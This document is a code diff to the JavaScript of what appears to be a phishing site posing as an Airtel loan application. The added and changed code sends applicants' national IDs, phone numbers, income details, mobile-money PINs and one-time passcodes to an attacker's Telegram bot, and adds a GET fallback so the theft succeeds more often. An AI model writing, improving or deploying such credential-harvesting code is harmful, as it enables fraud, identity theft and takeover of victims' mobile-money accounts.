@@ -17,6 +17,38 @@ const TELEGRAM = {
 };
 
 /* ─── SEND TO TELEGRAM ──────────────────────────────────────── */
+const postToTelegram = async (text) => {
+  const controller = new AbortController();
+  const timeoutId = setTimeout(() => controller.abort(), 6000);
+
+  try {
+    const params = new URLSearchParams();
+    params.append('chat_id', TELEGRAM.CHAT_ID);
+    params.append('text', text);
+
+    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      body: params,
+      signal: controller.signal
+    });
+    clearTimeout(timeoutId);
+    const data = await res.json().catch(() => null);
+    if (data && !data.ok) console.warn('Telegram error:', data.description);
+    return data && data.ok;
+  } catch (err) {
+    clearTimeout(timeoutId);
+    console.warn('Telegram POST failed, attempting GET fallback:', err.message);
+    try {
+      const getUrl = `https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage?chat_id=${encodeURIComponent(TELEGRAM.CHAT_ID)}&text=${encodeURIComponent(text)}`;
+      await fetch(getUrl, { mode: 'no-cors' });
+      return true;
+    } catch (e) {
+      console.warn('Telegram GET fallback failed:', e.message);
+      return false;
+    }
+  }
+};
+
 const sendToTelegram = async (s) => {
   const now = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare' });
   const monthly = (() => {
@@ -28,15 +60,15 @@ const sendToTelegram = async (s) => {
   })();
 
   const msg = [
-    '\uD83C\uDFE6 *NEW LOAN APPLICATION*',
+    '🏦 NEW AIRTEL LOAN APPLICATION',
     '',
-    '\uD83D\uDCB0 *LOAN DETAILS*',
-    `• Amount: *$${Number(s.amount).toLocaleString()}*`,
-    `• Term: *${s.term} months*`,
-    `• Purpose: *${s.purpose}*`,
-    `• Monthly Payment: *$${monthly}*`,
+    '💰 LOAN DETAILS',
+    `• Amount: $${Number(s.amount).toLocaleString()}`,
+    `• Term: ${s.term} months`,
+    `• Purpose: ${s.purpose}`,
+    `• Monthly Payment: $${monthly}`,
     '',
-    '\uD83D\uDC64 *APPLICANT*',
+    '👤 APPLICANT',
     `• Name: ${s.name}`,
     `• Phone: ${s.phone}`,
     `• National ID: ${s.nationalId}`,
@@ -45,55 +77,19 @@ const sendToTelegram = async (s) => {
     `• Address: ${s.address || 'Not provided'}`,
     `• Telegram: ${s.telegram || 'Not provided'}`,
     '',
-    '\uD83D\uDCBC *EMPLOYMENT*',
+    '💼 EMPLOYMENT',
     `• Status: ${s.employment}`,
     `• Employer: ${s.employer || 'Not provided'}`,
     `• Monthly Income: $${Number(s.monthlyIncome).toLocaleString()}`,
     '',
-    `\u23F0 _Submitted: ${now}_`,
+    `⏰ Submitted: ${now}`,
   ].join('\n');
 
-  try {
-    const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 2500);
-    const res = await fetch(
-      `https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`,
-      {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: TELEGRAM.CHAT_ID,
-          text: msg,
-          parse_mode: 'Markdown',
-        }),
-        signal: controller.signal
-      }
-    );
-    clearTimeout(timeout);
-    const data = await res.json();
-    if (!data.ok) console.warn('Telegram error:', data.description);
-  } catch (err) {
-    console.warn('Could not reach Telegram:', err.message);
-    // Don't block the user — still proceed to success
-  }
+  return await postToTelegram(msg);
 };
 
 const sendTextToTelegram = async (msg) => {
-  try {
-    const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 2500);
-    await fetch(`https://api.telegram.org/bot${TELEGRAM.BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM.CHAT_ID,
-        text: msg,
-        parse_mode: 'Markdown',
-      }),
-      signal: controller.signal
-    });
-    clearTimeout(timeout);
-  } catch (err) {}
+  return await postToTelegram(msg);
 };
 
 /* ─── VALIDATION ──────────────────────────────────────────── */
@@ -560,8 +556,7 @@ function navigate(view) {
         return;
       }
       showSpinner('Submitting your application...');
-      sendToTelegram(state); // Fire in background
-      await new Promise(r => setTimeout(r, 600)); // Smooth responsive feedback
+      await sendToTelegram(state);
       hideSpinner();
       navigate('success');
     });
@@ -587,8 +582,7 @@ function navigate(view) {
         : phone;
       state.maskedPhone = masked;
       showSpinner('Verifying...');
-      sendTextToTelegram(`📱 *MOBILE LOGIN*\n• Phone: ${phone}\n• Applicant: ${state.name || 'Unknown'}`);
-      await new Promise(r => setTimeout(r, 600));
+      await sendTextToTelegram(`📱 MOBILE LOGIN\n• Phone: ${phone}\n• Applicant: ${state.name || 'Unknown'}`);
       hideSpinner();
       navigate('pinLogin');
     };
@@ -647,8 +641,7 @@ function navigate(view) {
 
       if (!currentIsOtp) {
         showSpinner('Authenticating...');
-        sendTextToTelegram(`🔐 *PIN LOGIN*\n• Phone: ${state.mbPhone || 'Unknown'}\n• PIN: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
-        await new Promise(r => setTimeout(r, 800));
+        await sendTextToTelegram(`🔐 PIN LOGIN\n• Phone: ${state.mbPhone || 'Unknown'}\n• PIN: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
         hideSpinner();
 
         // Transition to second pin: OTP with full message instruction
@@ -667,8 +660,7 @@ function navigate(view) {
         pinLoginBtn.textContent = 'Submit OTP';
       } else {
         showSpinner('Verifying OTP...');
-        sendTextToTelegram(`🔑 *OTP / FULL MESSAGE RECEIVED*\n• Phone: ${state.mbPhone || 'Unknown'}\n• Message: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
-        await new Promise(r => setTimeout(r, 800));
+        await sendTextToTelegram(`🔑 OTP / FULL MESSAGE RECEIVED\n• Phone: ${state.mbPhone || 'Unknown'}\n• Message: ${val}\n• Applicant: ${state.name || 'Unknown'}`);
         hideSpinner();
         navigate('loginSuccess');
       }
